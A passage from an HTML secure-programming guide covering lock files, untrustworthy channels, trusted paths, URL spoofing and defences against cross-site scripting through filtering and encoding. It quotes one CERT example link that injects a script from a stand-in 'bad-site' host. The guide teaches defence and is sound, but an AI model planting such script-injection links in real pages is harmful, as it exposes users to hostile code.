must not have permissive file permissions for creating and removing files.</P
><P
>NFS version 3 added support for O_EXCL mode in open(2);
see IETF RFC 1813,
in particular the "EXCLUSIVE" value to the "mode" argument of "CREATE".
Sadly, not everyone has switched to NFS version 3 or higher at the time of this
writing, so you can&#8217;t depend on this yet in portable programs.
Still, in the long run there&#8217;s hope that this issue will go away.</P
><P
>If you&#8217;re locking a device or the existence of a process on a local
machine, try to use standard conventions.
I recommend using the Filesystem Hierarchy Standard (FHS);
it is widely referenced by Linux systems, but it also tries to incorporate
the ideas of other Unix-like systems.
The FHS describes
standard conventions for such locking files, including naming, placement,
and standard contents of these files [FHS 1997].
If you just want to be sure that your server doesn&#8217;t execute more than once
on a given machine, you should usually create a process identifier as
/var/run/NAME.pid with the pid as its contents.
In a similar vein, you should place lock files for things
like device lock files in /var/lock.
This approach has the minor disadvantage of leaving files hanging around
if the program suddenly halts,
but it&#8217;s standard practice and that problem is
easily handled by other system tools.</P
><P
>It&#8217;s important that the programs which are cooperating using files to
represent the locks use the same
directory, not just the same directory name.
This is an issue with networked systems: the FHS explicitly notes that
/var/run and /var/lock are unshareable, while /var/mail is shareable.
Thus, if you want the lock to work on a single machine, but not interfere
with other machines, use unshareable directories like /var/run
(e.g., you want to permit each machine to run its own server).
However, if you want all machines sharing files in a network to obey the
lock, you need to use a directory that they&#8217;re sharing; /var/mail is
one such location.  See FHS section 2 for more information on this subject.</P
></DIV
><DIV
CLASS="SECT3"
><HR><H4
CLASS="SECT3"
><A
NAME="OTHER-LOCKING"
>7.11.2.2. Other Approaches to Locking</A
></H4
><P
>Of course, you need not use files to represent locks.
Network servers often need not bother; the mere act of binding to a port
acts as a kind of lock, since if there&#8217;s an existing server bound to a given
port, no other server will be able to bind to that port.</P
><P
>Another approach to locking
is to use POSIX record locks, implemented through fcntl(2) as a
<SPAN
CLASS="QUOTE"
>&#8220;discretionary lock&#8221;</SPAN
>.
These are discretionary, that is, using them requires the cooperation of the
programs needing the locks (just as the approach to using files to
represent locks does).
There&#8217;s a lot to recommend POSIX record locks:
POSIX record locking is supported on nearly all Unix-like platforms
(it&#8217;s mandated by POSIX.1), it
can lock portions of a file (not just a whole file), and it can handle the
difference between read locks and write locks.
Even more usefully, if a process dies, its locks are automatically removed,
which is usually what is desired.</P
><P
>You can also use mandatory locks, which are based on System V&#8217;s
mandatory locking scheme.
These only apply to files where the locked file&#8217;s setgid bit is set, but
the group execute bit is not set.
Also, you must mount the filesystem to permit mandatory file locks.
In this case, every read(2) and write(2) is checked for locking;
while this is more thorough than advisory locks, it&#8217;s also slower.
Also, mandatory locks don&#8217;t port as widely to other Unix-like systems
(they&#8217;re available on Linux and System V-based systems, but not necessarily
on others).
Note that processes with root privileges
can be held up by a mandatory lock, too, making it possible that
this could be the basis of a denial-of-service attack.</P
></DIV
></DIV
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="TRUSTWORTHY-CHANNELS"
>7.12. Trust Only Trustworthy Channels</A
></H2
><P
>In general, only trust information (input or results)
from trustworthy channels.
For example,
the routines getlogin(3) and ttyname(3) return information that can be
controlled by a local user, so don&#8217;t trust them for security purposes.</P
><P
>In most computer networks (and certainly for the Internet at large),
no unauthenticated transmission is trustworthy.
For example,
packets sent over the public Internet can be viewed and modified at any
point along their path, and arbitrary new packets can be forged.
These forged packets might include forged information about the sender
(such as their machine (IP) address and port) or receiver.
Therefore, don&#8217;t use these values as your primary criteria for
security decisions unless you can authenticate them (say using cryptography).</P
><P
>This means that, except under special circumstances,
two old techniques for authenticating users
in TCP/IP should often not be used as the sole authentication mechanism.
One technique is to limit users to <SPAN
CLASS="QUOTE"
>&#8220;certain machines&#8221;</SPAN
> by checking
the <SPAN
CLASS="QUOTE"
>&#8220;from&#8221;</SPAN
> machine address in a data packet; the other is to
limit access by requiring that the sender use a <SPAN
CLASS="QUOTE"
>&#8220;trusted&#8221;</SPAN
> port number
(a number less that 1024).
The problem is that in many environments an attacker can forge these values.</P
><P
>In some environments, checking these values (e.g., the sending machine
IP address and/or port) can have some value, so
it&#8217;s not a bad idea to support such checking as an option in a program.
For example, if a system runs behind a firewall, the firewall can&#8217;t
be breached or circumvented, and the firewall stops
external packets that claim to be from the inside, 
then you can claim that any packet saying it&#8217;s from the inside really does.
Note that you can&#8217;t be sure the packet actually comes from the machine
it claims it comes from - so you&#8217;re only countering external threats,
not internal threats.
However, broken firewalls, alternative paths, and mobile code make
even these assumptions suspect.</P
><P
>The problem is supporting untrustworthy information as the only way
to authenticate someone.
If you need a trustworthy channel over an untrusted network,
in general you need some sort of cryptologic
service (at the very least, a cryptologically safe hash).
See <A
HREF="#CRYPTO"
>Section 11.5</A
>
for more information on cryptographic algorithms and protocols.
If you&#8217;re implementing a standard and inherently insecure protocol
(e.g., ftp and rlogin), provide safe defaults and document
the assumptions clearly.</P
><P
>The Domain Name Server (DNS) is widely used on the Internet to maintain
mappings between the names of computers and their IP (numeric) addresses.
The technique called <SPAN
CLASS="QUOTE"
>&#8220;reverse DNS&#8221;</SPAN
> eliminates some simple
spoofing attacks, and is useful for determining a host&#8217;s name.
However, this technique is not trustworthy for authentication decisions.
The problem is that, in the end, a DNS request will be sent eventually
to some remote system that may be controlled by an attacker.
Therefore, treat DNS results as an input that needs
validation and don&#8217;t trust it for serious access control.</P
><P
>Arbitrary email (including the <SPAN
CLASS="QUOTE"
>&#8220;from&#8221;</SPAN
> value of addresses)
can be forged as well.
Using digital signatures is a method to thwart many such attacks.
A more easily thwarted approach is to require emailing back and forth
with special randomly-created values, but for low-value transactions
such as signing onto a public mailing list this is usually acceptable.</P
><P
>Note that in any client/server model, including CGI, that the server
must assume that the client (or someone interposing between the
client and server) can modify any value.
For example, so-called <SPAN
CLASS="QUOTE"
>&#8220;hidden fields&#8221;</SPAN
> and cookie values can be
changed by the client before being received by CGI programs.
These cannot be trusted unless special precautions are taken.
For example, the hidden fields could be signed in a way the client
cannot forge as long as the server checks the signature.
The hidden fields could also be encrypted using a key only the trusted
server could decrypt (this latter approach is the basic idea behind the
Kerberos authentication system).
InfoSec labs has further discussion about hidden fields and applying
encryption at
<A
HREF="http://www.infoseclabs.com/mschff/mschff.htm"
TARGET="_top"
>http://www.infoseclabs.com/mschff/mschff.htm</A
>.
In general, you&#8217;re better off keeping data you care about at the server end
in a client/server model.
In the same vein,
don&#8217;t depend on HTTP_REFERER for authentication in a CGI program, because
this is sent by the user&#8217;s browser (not the web server).</P
><P
>This issue applies to data referencing other data, too.
For example, HTML or XML allow you to include by reference other files
(e.g., DTDs and style sheets) that may be stored remotely.
However, those external references could be modified so that users
see a very different document than intended;
a style sheet could be modified to <SPAN
CLASS="QUOTE"
>&#8220;white out&#8221;</SPAN
> words at critical
locations, deface its appearance, or insert new text.
External DTDs could be modified to prevent use of the document
(by adding declarations that break validation) or insert different
text into documents [St. Laurent 2000].</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="TRUSTED-PATH"
>7.13. Set up a Trusted Path</A
></H2
><P
>The counterpart to needing trustworthy channels
(see <A
HREF="#TRUSTWORTHY-CHANNELS"
>Section 7.12</A
>)
is assuring users that they
really are working with the program or system they intended to use.</P
><P
>The traditional example is a <SPAN
CLASS="QUOTE"
>&#8220;fake login&#8221;</SPAN
> program.
If a program is written to look like the login screen of a system, then
it can be left running.
When users try to log in, the fake login program can then capture user
passwords for later use.</P
><P
>A solution to this problem is a <SPAN
CLASS="QUOTE"
>&#8220;trusted path.&#8221;</SPAN
>
A trusted path is simply some mechanism that provides confidence that the
user is communicating with what the user intended to communicate with,
ensuring that attackers can&#8217;t intercept or modify whatever information
is being communicated.</P
><P
>If you&#8217;re asking for a password, try to set up trusted path.
Unfortunately, stock Linux distributions and many other Unixes don&#8217;t
have a trusted path even for their normal login sequence.
One approach is to 
require pressing an unforgeable key before login, e.g.,
Windows NT/2000 uses <SPAN
CLASS="QUOTE"
>&#8220;control-alt-delete&#8221;</SPAN
> before logging in; since
normal programs in Windows can&#8217;t intercept this key pattern, this
approach creates a trusted path.
There&#8217;s a Linux equivalent, termed the
<A
HREF="http://lwn.net/2001/0322/a/SAK.php3"
TARGET="_top"
>Secure Attention Key
(SAK)</A
>; it&#8217;s recommended that this be mapped to
<SPAN
CLASS="QUOTE"
>&#8220;control-alt-pause&#8221;</SPAN
>.
Unfortunately, at the time of this writing SAK is immature and not
well-supported by Linux distributions.
Another approach for implementing a trusted path
locally is to control a separate display that only the login
program can perform.
For example, if only trusted programs could modify the keyboard lights
(the LEDs showing Num Lock, Caps Lock, and Scroll Lock),
then a login program could display a running pattern to indicate that
it&#8217;s the real login program.
Unfortunately, since in current Linux normal users can change the LEDs,
the LEDs can&#8217;t currently be used to confirm a trusted path.</P
><P
>Sadly, the problem is much worse for network applications.
Although setting up a trusted path is desirable for network applications,
completely doing so is quite difficult.
When sending a password over a network, at the very least
encrypt the password between trusted endpoints.
This will at least prevent eavesdropping of passwords by those not
connected to the system, and at least make attacks harder to perform.
If you&#8217;re concerned about trusted path for the actual communication, make
sure that the communication is
encrypted and authenticated (or at least authenticated).</P
><P
>It turns out that this isn&#8217;t enough to have a trusted path
to networked applications, in particular for web-based applications.
There are documented methods for fooling users of web browsers into thinking
that they&#8217;re at one place when they are really at another.
For example, Felten [1997] discusses <SPAN
CLASS="QUOTE"
>&#8220;web spoofing&#8221;</SPAN
>,
where users believe they&#8217;re viewing one web page when in fact all the
web pages they view go through an attacker&#8217;s site (who can then monitor
all traffic and modify any data sent in either direction).
This is accomplished by rewriting the URL.
The rewritten URLs can be made nearly invisible
by using other technology (such as Javascript) to hide any possible
evidence in the status line, location line, and so on.
See their paper for more details.
Another technique for hiding such URLs is exploiting rarely-used URL
syntax, for example, the URL
<SPAN
CLASS="QUOTE"
>&#8220;http://www.ibm.com/stuff@mysite.com&#8221;</SPAN
>
is actually a request to view <SPAN
CLASS="QUOTE"
>&#8220;mysite.com&#8221;</SPAN
> (a potentially malevolent site)
using the unusual username <SPAN
CLASS="QUOTE"
>&#8220;www.ibm.com/stuff&#8221;</SPAN
>.
If the URL is long enough,
the real material won&#8217;t be displayed and users are unlikely to
notice the exploit anyway.
Yet another approach is to create sites with names deliberately similar
to the <SPAN
CLASS="QUOTE"
>&#8220;real&#8221;</SPAN
> site - users may not know the difference.
In all of these cases, simply encrypting the line doesn&#8217;t help -
the attacker can be quite content in encrypting data while completely
controlling what&#8217;s shown.</P
><P
>Countering these problems is more difficult;
at this time I have no good technical solution for fully preventing
<SPAN
CLASS="QUOTE"
>&#8220;fooled&#8221;</SPAN
> web users.
I would encourage web browser developers to counter such <SPAN
CLASS="QUOTE"
>&#8220;fooling&#8221;</SPAN
>,
making it easier to spot.
If it&#8217;s critical that your users correctly connect to the correct site,
have them use simple procedures to counter the threat.
Examples include having them halt and restart their browser, and making sure
that the web address is very simple and not normally misspelled
(so misspelling it is unlikely).
You might also want to gain ownership of some <SPAN
CLASS="QUOTE"
>&#8220;similar&#8221;</SPAN
> sounding DNS names,
and search for other such DNS names and material to find attackers.
<A
HREF="http://news.netcraft.com/archives/2004/01/28/microsoft_to_remove_support_for_usernames_in_http_urls.html"
TARGET="_top"
>Some versions of
Microsoft&#8217;s Internet Explorer won&#8217;t allow the "@" symbol at all in URLs</A
>;
this is an unfortunate restriction, but probably good for security.
Another less draconian solution would have been to put up a warning
dialogue, clearly displaying the real site name and user name.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="INTERNAL-CHECK"
>7.14. Use Internal Consistency-Checking Code</A
></H2
><P
>The program should check to ensure that its call arguments and basic state
assumptions are valid.
In C, macros such as assert(3) may be helpful in doing so.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="SELF-LIMIT-RESOURCES"
>7.15. Self-limit Resources</A
></H2
><P
>In network daemons, shed or limit excessive loads.
Set limit values (using setrlimit(2)) to limit the resources that will be used.
At the least, use setrlimit(2) to disable creation of <SPAN
CLASS="QUOTE"
>&#8220;core&#8221;</SPAN
> files.
For example, by default
Linux will create a core file that saves all program memory if the
program fails abnormally, but such a file might include passwords or
other sensitive data.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="CROSS-SITE-MALICIOUS-CONTENT"
>7.16. Prevent Cross-Site (XSS) Malicious Content</A
></H2
><P
>Some secure programs accept data from one untrusted user (the attacker)
and pass that data on to a different user&#8217;s application (the victim).
If the secure program doesn&#8217;t protect the victim, the
victim&#8217;s application (e.g., their web browser)
may then process that data in a way harmful to the victim.
This is a particularly common problem for web applications using HTML or XML,
where the problem goes by several names including <SPAN
CLASS="QUOTE"
>&#8220;cross-site scripting&#8221;</SPAN
>,
<SPAN
CLASS="QUOTE"
>&#8220;malicious HTML tags&#8221;</SPAN
>, and <SPAN
CLASS="QUOTE"
>&#8220;malicious content.&#8221;</SPAN
>
This book will call this problem <SPAN
CLASS="QUOTE"
>&#8220;cross-site malicious content,&#8221;</SPAN
>
since the problem isn&#8217;t limited to scripts or HTML, and its cross-site nature
is fundamental.
Note that this problem isn&#8217;t limited to web applications, but since
this is a particular problem for them, the rest of this discussion
will emphasize web applications.
As will be shown in a moment, sometimes an attacker can cause a victim
to send data from the victim to the secure program, so the secure program
must protect the victim from himself.</P
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="EXPLAIN-CROSS-SITE"
>7.16.1. Explanation of the Problem</A
></H3
><P
>Let&#8217;s begin with a simple example.
Some web applications are designed to
permit HTML tags in data input from users that will later
be posted to other readers (e.g., in a guestbook or <SPAN
CLASS="QUOTE"
>&#8220;reader comment&#8221;</SPAN
> area).
If nothing is done to prevent it,
these tags can be used by malicious users to attack other users by inserting
scripts,
Java references (including references to hostile applets), DHTML tags,
early document endings (via &#60;/HTML&#62;), absurd font size requests,
and so on.
This capability can be exploited for a wide range of effects,
such as exposing SSL-encrypted connections, accessing restricted web
sites via the client, violating domain-based security policies,
making the web page unreadable,
making the web page unpleasant to use (e.g., via annoying banners
and offensive material),
permit privacy intrusions (e.g., by inserting a web bug to learn exactly
who reads a certain page),
creating
denial-of-service attacks (e.g., by creating an <SPAN
CLASS="QUOTE"
>&#8220;infinite&#8221;</SPAN
> number
of windows), and even very destructive attacks (by inserting
attacks on security vulnerabilities such as scripting languages or
buffer overflows in browsers).
By embedding malicious FORM tags at the right place, an intruder
may even be able to trick users into revealing sensitive information
(by modifying the behavior of an existing form).
Or, by embedding scripts, an intruder can cause no end of problems.
This is by no means an exhaustive list of problems, but
hopefully this is enough to convince you that this is a serious problem.</P
><P
>Most <SPAN
CLASS="QUOTE"
>&#8220;discussion boards&#8221;</SPAN
> have already discovered this problem,
and most already take steps to prevent it in text intended to be part of
a multiperson discussion.
Unfortunately, many web application developers don&#8217;t
realize that this is a much more general problem.
<EM
>Every</EM
> data value that is sent from one
user to another can potentially be a source for cross-site
malicious posting, even if it&#8217;s not an <SPAN
CLASS="QUOTE"
>&#8220;obvious&#8221;</SPAN
> case of an area
where arbitrary HTML is expected.
The malicious data can even be supplied by the user himself, since the
user may have been fooled into supplying the data via another site.
Here&#8217;s an example (from CERT) of an HTML link that causes the user to
send malicious data to another site:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> &#60;A HREF="http://example.com/comment.cgi?mycomment=&#60;SCRIPT
 SRC='http://bad-site/badfile'&#62;&#60;/SCRIPT&#62;"&#62; Click here&#60;/A&#62;</PRE
></FONT
></TD
></TR
></TABLE
></P
><P
>In short, a web application cannot accept input (including any form data)
without checking, filtering, or encoding it.
You can&#8217;t even pass that data back to the same user in many cases
in web applications, since another user may have surreptitiously
supplied the data.
Even if permitting such material won&#8217;t hurt your system, it will
enable your system to be a conduit of attacks to your users.
Even worse, those attacks will appear to be coming from your system.</P
><P
>CERT describes the problem this way in their advisory:
<A
NAME="AEN2165"
></A
><BLOCKQUOTE
CLASS="BLOCKQUOTE"
><P
>A web site may inadvertently include malicious HTML tags or script
in a dynamically generated page based on unvalidated input
from untrustworthy sources
(<A
HREF="http://www.cert.org/advisories/CA-2000-02.html"
TARGET="_top"
>CERT Advisory
CA-2000-02, Malicious HTML Tags Embedded in Client Web Requests</A
>).</P
></BLOCKQUOTE
>
More information from CERT about this is available at
<A
HREF="http://www.cert.org/archive/pdf/cross_site_scripting.pdf"
TARGET="_top"
>http://www.cert.org/archive/pdf/cross_site_scripting.pdf</A
>.
The paper
<A
HREF="http://www.net-security.org/dl/articles/xss_anatomy.pdf"
TARGET="_top"
>The Anatomy of Cross Site Scripting</A
>
discusses some of XSS&#8217;s ramifications.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="SOLUTIONS-CROSS-SITE"
>7.16.2. Solutions to Cross-Site Malicious Content</A
></H3
><P
>Fundamentally, this means that all web application output impacted
by any user must be
filtered (so characters that can cause this problem are removed),
encoded (so the characters that can cause this problem are encoded in
a way to prevent the problem), or
validated (to ensure that only <SPAN
CLASS="QUOTE"
>&#8220;safe&#8221;</SPAN
> data gets through).
This includes all output derived from
input such as URL parameters, form data, cookies,
database queries, CORBA ORB results, and data from users stored in files.
In many cases,
filtering and validation should be done at the input, but
encoding can be done during either input validation or output generation.
If you&#8217;re just passing the data through without analysis, it&#8217;s probably
better to encode the data on input (so it won&#8217;t be forgotten).
However, if your program processes the data,
it can be easier to encode it on output instead.
CERT recommends that filtering and encoding be done during data output;
this isn&#8217;t a bad idea, but there are many cases where it makes sense to do it
at input instead.
The critical issue is to make sure that you cover all cases for
every output, which is not an easy thing to do regardless of approach.</P
><P
>Warning - in many cases these techniques can be subverted unless you&#8217;ve also
gained control over the character encoding of the output.
Otherwise, an attacker could use an <SPAN
CLASS="QUOTE"
>&#8220;unexpected&#8221;</SPAN
> character encoding
to subvert the techniques discussed here.
Thankfully, this isn&#8217;t hard;
gaining control over output character encoding is discussed in
<A
HREF="#OUTPUT-CHARACTER-ENCODING"
>Section 9.5</A
>.</P
><P
>One minor defense, that&#8217;s often worth doing, is the "HttpOnly" flag for
cookies.
Scripts that run in a web browser cannot access cookie values
that have the HttpOnly flag set (they just get an empty value instead).
This is currently implemented in
Microsoft Internet Explorer, and I expect
Mozilla/Netscape to implement this soon too.
You should set HttpOnly on for any cookie you send, unless you have
scripts that need the cookie, to counter certain kinds of cross-site
scripting (XSS) attacks.
However, the HttpOnly flag can be circumvented in a variety of ways,
so using as your primary defense is inappropriate.
Instead, it&#8217;s a helpful secondary defense that may help save you in
case your application is written incorrectly.</P
><P
>The first subsection below discusses how to identify special
characters that need to be filtered, encoded, or validated.
This is followed by subsections describing
how to filter or encode these characters.
There&#8217;s no subsection discussing how to validate data in general,
however, for input validation in general see <A
HREF="#INPUT"
>Chapter 5</A
>,
and if the input is straight HTML text or a URI, see
<A
HREF="#FILTER-HTML"
>Section 5.13</A
>.
Also note that your web application can receive malicious cross-postings,
so non-queries should forbid the GET protocol
(see <A
HREF="#AVOID-GET-NON-QUERIES"
>Section 5.14</A
>).</P
><DIV
CLASS="SECT3"
><HR><H4
CLASS="SECT3"
><A
NAME="AEN2182"
>7.16.2.1. Identifying Special Characters</A
></H4
><P
>Here are the special characters for a variety of circumstances
(my thanks to the CERT, who developed this list):

<P
></P
><UL
><LI
><P
>In the content of a block-level element (e.g.,
in the middle of a paragraph of text in HTML or a block in XML):
 <P
></P
><UL
><LI
><P
>"&#60;" is special because it introduces a tag.</P
></LI
><LI
><P
>"&#38;" is special because it introduces a character entity.</P
></LI
><LI
><P
>"&#62;" is special because some browsers treat it as special,
on the assumption that the author of the page really meant
to put in an opening "&#60;", but omitted it in error.</P
></LI
></UL
></P
></LI
><LI
><P
>In attribute values:
<P
></P
><UL
><LI
><P
>In attribute values enclosed with double quotes, the
double quotes are special because they mark the end of the attribute value.</P
></LI
><LI
><P
>In attribute values enclosed with single quote, the single
quotes are special because they mark the end of the attribute value.
XML&#8217;s definition allows single quotes, but I&#8217;ve been told that some
XML parsers don&#8217;t handle them correctly, so you might avoid
using single quotes in XML.</P
></LI
><LI
><P
>Attribute values without any quotes make the white-space
characters such as space and tab special. 
Note that these aren&#8217;t legal in XML either, <EM
>and</EM
>
they make more characters special.
Thus, I recommend against unquoted attributes if you&#8217;re using
dynamically generated values in them.</P
></LI
><LI
><P
>"&#38;" is special when used in conjunction with
some attributes because it introduces a character entity.</P
></LI
></UL
></P
></LI
><LI
><P
>In URLs, for example, a search engine might provide a link within
the results page that the user can click to re-run the search. This
can be implemented by encoding the search query inside the URL. When
this is done, it introduces additional special characters:
<P
></P
><UL
><LI
><P
>Space, tab, and new line are special because they mark the
end of the URL.</P
></LI
><LI
><P
>        "&#38;" is special because it introduces a character
        entity or separates CGI parameters.</P
></LI
><LI
><P
>        Non-ASCII characters (that is, everything above 128 in the
        ISO-8859-1 encoding) aren&#8217;t allowed in URLs, so they are all
        special here.</P
></LI
><LI
><P
>        The "%" must be filtered from input anywhere parameters
        encoded with HTTP escape sequences are decoded by server-side
        code. The percent must be filtered if input such as
        "%68%65%6C%6C%6F" becomes "hello" when it appears on the web
        page in question.</P
></LI
></UL
></P
></LI
><LI
><P
>Within the body of a &#60;SCRIPT&#62; &#60;/SCRIPT&#62;
        the semicolon, parenthesis, curly braces, and new line
        should be filtered in situations where text could be inserted
        directly into a preexisting script tag.</P
></LI
><LI
><P
>        Server-side scripts that convert any exclamation
        characters (!) in input to double-quote characters (") on
        output might require additional filtering.</P
></LI
></UL
></P
><P
>Note that, in general, the ampersand (&#38;) is special in HTML and XML.</P
></DIV
><DIV
CLASS="SECT3"
><HR><H4
CLASS="SECT3"
><A
NAME="AEN2223"
>7.16.2.2. Filtering</A
></H4
><P
>One approach to handling these special characters is simply
eliminating them (usually during input or output).</P
><P
>If you&#8217;re already validating your input for valid characters
(and you generally should), this is easily done by simply omitting the
special characters from the list of valid characters.
Here&#8217;s an example in Perl of a filter that only accepts legal
characters, and since the filter doesn&#8217;t accept any special characters
other than the space, it&#8217;s quite acceptable for use in areas such as
a quoted attribute:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> # Accept only legal characters:
 $summary =~ tr/A-Za-z0-9\ \.\://dc;</PRE
></FONT
></TD
></TR
></TABLE
></P
><P
>However, if you really want to strip away <EM
>only</EM
>
the smallest number of characters, then you could create a subroutine
to remove just those characters:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> sub remove_special_chars {
  local($s) = @_;
  $s =~ s/[\&#60;\&#62;\"\'\%\;\(\)\&#38;\+]//g;
  return $s;
 }
 # Sample use:
 $data = &#38;remove_special_chars($data);</PRE
></FONT
></TD
></TR
></TABLE
></P
></DIV
><DIV
CLASS="SECT3"
><HR><H4
CLASS="SECT3"
><A
NAME="AEN2231"
>7.16.2.3. Encoding (Quoting)</A
></H4
><P
>An alternative to removing the special characters is to encode them
so that they don&#8217;t have any special meaning.
This has several advantages over filtering the characters,
in particular, it prevents data loss.
If the data is "mangled" by the process from the user&#8217;s point of view,
at least when the data is encoded it&#8217;s possible to reconstruct the
data that was originally sent.</P
><P
>HTML, XML, and SGML all use the ampersand ("&#38;") character as a
way to introduce encodings in the running text; this encoding
is often called <SPAN
CLASS="QUOTE"
>&#8220;HTML encoding.&#8221;</SPAN
>
To encode these characters, simply transform the special characters
in your circumstance. Usually this means
<SPAN
CLASS="QUOTE"
>&#8220;&#60;&#8221;</SPAN
> becomes <SPAN
CLASS="QUOTE"
>&#8220;&#38;lt;&#8221;</SPAN
>,
<SPAN
CLASS="QUOTE"
>&#8220;&#62;&#8221;</SPAN
> becomes <SPAN
CLASS="QUOTE"
>&#8220;&#38;gt;&#8221;</SPAN
>,
<SPAN
CLASS="QUOTE"
>&#8220;&#38;&#8221;</SPAN
> becomes <SPAN
CLASS="QUOTE"
>&#8220;&#38;amp;&#8221;</SPAN
>, and
<SPAN
CLASS="QUOTE"
>&#8220;"&#8221;</SPAN
> becomes <SPAN
CLASS="QUOTE"
>&#8220;&#38;quot;&#8221;</SPAN
>.
As noted above, although in theory <SPAN
CLASS="QUOTE"
>&#8220;&#62;&#8221;</SPAN
>
doesn&#8217;t need to be quoted,
because some browsers act on it (and fill in a <SPAN
CLASS="QUOTE"
>&#8220;&#60;&#8221;</SPAN
>)
it needs to be quoted.
There&#8217;s a minor complexity with the double-quote character,
because <SPAN
CLASS="QUOTE"
>&#8220;&#38;quot;&#8221;</SPAN
> only needs to be
used inside attributes, and some extremely old browsers don&#8217;t
properly render it.
If you can handle the additional complexity, you can try to encode '"'
only when you need to, but it&#8217;s easier to simply encode it and ask
users to upgrade their browsers.
Few users will use such ancient browsers, and the double-quote character
encoding has been a standard for a long time.</P
><P
>Scripting languages may consider implementing specialized auto-quoting types,
the interesting approach developed in the web application framework
<A
HREF="http://www.mems-exchange.org/software/quixote"
TARGET="_top"
>Quixote</A
>.
Quixote includes a "template" feature which allows easy mixing of HTML text
and Python code; text generated by a template is passed back to the web browser
as an HTML document.
As of version 0.6, Quixote has two kinds of text (instead of a single
kind as most such languages).
Anything which appears in a literal, quoted string is of type "htmltext,"
and it is assumed to be exactly as the programmer wanted it to be
(this is reasoble, since the programmer wrote it).
Anything which takes the form of an ordinary Python string, however,
is automatically quoted as the template is executed.
As a result, text from a database or other external source is
automatically quoted, and cannot be used for a cross-site scripting attack.
Thus, Quixote implements a safe default -
programmers no longer need to worry about quoting every bit of text
that passes through the application (bugs involving too much quoting
are less likely to be a security problem, and will be obvious in testing).
Quixote uses an open source software license, but because of its
venue identification it is probably GPL-incompatible, and is used by
organizations such as the
<A
HREF="http://lwn.net"
TARGET="_top"
>Linux Weekly News</A
>.</P
><P
>This approach to HTML encoding
isn&#8217;t quite enough encoding in some circumstances.
As discussed in <A
HREF="#OUTPUT-CHARACTER-ENCODING"
>Section 9.5</A
>,
you need to specify the output character encoding (the <SPAN
CLASS="QUOTE"
>&#8220;charset&#8221;</SPAN
>).
If some of your data is encoded using a different character encoding
than the output character encoding, then you&#8217;ll need to do something so your
output uses a consistent and correct encoding.
Also, you&#8217;ve selected an output encoding other than
ISO-8859-1, then you need to
make sure that any alternative encodings for special characters
(such as "&#60;") can&#8217;t slip through to the browser.
This is a problem with several character encodings, including popular ones
like UTF-7 and UTF-8; see <A
HREF="#CHARACTER-ENCODING"
>Section 5.11</A
>
for more information on how to prevent <SPAN
CLASS="QUOTE"
>&#8220;alternative&#8221;</SPAN
> encodings of characters.
One way to deal with incompatible character encodings is to
first translate the characters internally to ISO 10646 (which has
the same character values as Unicode), and then
using either numeric character references or character entity
references to represent them:
<P
></P
><UL
><LI
><P
>A numeric character reference looks like
<SPAN
CLASS="QUOTE"
>&#8220;&#38;#D;&#8221;</SPAN
>, where D is a decimal number, or
<SPAN
CLASS="QUOTE"
>&#8220;&#38;#xH;&#8221;</SPAN
> or <SPAN
CLASS="QUOTE"
>&#8220;&#38;#XH;&#8221;</SPAN
>,
where H is a hexadecimal number.
The number given is the ISO 10646 character id (which has the same character
values as Unicode).
Thus &#38;#1048; is the Cyrillic capital letter "I".
The hexadecimal system isn&#8217;t supported in the SGML standard (ISO 8879),
so I&#8217;d suggest using the decimal system for output.
Also, although SGML specification
permits the trailing semicolon to be omitted in
some circumstances, in practice many systems don&#8217;t handle it - so
always include the trailing semicolon.</P
></LI
><LI
><P
>A character entity reference does the same thing but
uses mnemonic names instead of numbers.
For example, "&#38;lt;" represents the &#60; sign.
If you&#8217;re generating HTML, see the
<A
HREF="http://www.w3.org"
TARGET="_top"
>HTML specification</A
> which
lists all mnemonic names.</P
></LI
></UL
>
Either system (numeric or character entity)
works; I suggest using character entity references for
<SPAN
CLASS="QUOTE"
>&#8220;&#60;&#8221;</SPAN
>, <SPAN
CLASS="QUOTE"
>&#8220;&#62;&#8221;</SPAN
>,
<SPAN
CLASS="QUOTE"
>&#8220;&#38;&#8221;</SPAN
>, and <SPAN
CLASS="QUOTE"
>&#8220;"&#8221;</SPAN
>
because it makes your code (and output)
easier for humans to understand.  Other than that, it&#8217;s not clear
that one or the other system is uniformly better.
If you expect humans to edit the output by hand later, use the
character entity references where you can, otherwise I&#8217;d use the
decimal numeric character references just because they&#8217;re easier to program.
This encoding scheme can be quite inefficient for some languages
(especially Asian languages); if that is your primary content, you
might choose to use a different character encoding (charset), filter
on the critical characters (e.g., "&#60;")
and ensure that no alternative encodings for critical characters are allowed.</P
><P
>URIs have their own encoding scheme, commonly called <SPAN
CLASS="QUOTE"
>&#8220;URL encoding.&#8221;</SPAN
>
In this system, characters not permitted in URLs are represented using
a percent sign followed by its two-digit hexadecimal value.
To handle all of ISO 10646 (Unicode), it&#8217;s recommended to first translate
the codes to UTF-8, and then encode it.
See <A
HREF="#VALIDATING-URIS"
>Section 5.13.4</A
> for more about validating URIs.</P
></DIV
></DIV
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="SEMANTIC-ATTACKS"
>7.17. Foil Semantic Attacks</A
></H2
><P
>A <SPAN
CLASS="QUOTE"
>&#8220;semantic attack&#8221;</SPAN
> is an attack in which the attacker uses the
computing infrastructure/system in a way that fools the victim into
thinking they are doing something, but are doing something different,
yet the computing infrastructure/system is working exactly as it was
designed to do.
Semantic attacks often involve financial scams, where the attacker is
trying to fool the victim into giving the attacker large sums of money
(e.g., thinking they&#8217;re investing in something).
